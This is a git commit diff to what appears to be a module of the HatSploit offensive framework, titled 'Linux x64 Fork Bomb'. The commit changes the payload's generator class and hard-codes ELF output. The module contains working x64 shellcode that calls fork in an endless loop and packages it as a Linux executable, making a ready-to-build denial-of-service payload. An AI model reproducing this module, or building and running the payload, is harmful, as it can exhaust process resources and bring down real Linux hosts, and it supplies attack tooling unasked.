d4825165e46db023ad595f1673cf36107da09d7b
Ivan Nikolsky <enty8080@gmail.com>
2021-04-24 12:59:32 +0300

    Update fork_bomb.py

--- payloads/linux/x64/fork_bomb.py
+++ payloads/linux/x64/fork_bomb.py
@@ -25,10 +25,10 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 
 
-class HatSploitPayload(Payload, PayloadGenerator):
+class HatSploitPayload(Payload, HatVenom):
     details = {
         'Category': "stager",
         'Name': "Linux x64 Fork Bomb",
@@ -49,28 +49,13 @@ class HatSploitPayload(Payload, PayloadGenerator):
         'Type': "one_side"
     }
 
-    options = {
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "elf",
-            'Type': None,
-            'Required': True
-        }
-    }
-
     def run(self):
-        executable_format = self.parse_options(self.options)
-
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
-
         self.output_process("Generating shellcode...")
         shellcode = (
             b"\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\xeb\xf5"
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'x64', shellcode)
+        payload = self.generate('elf', 'x64', shellcode)
 
         return payload
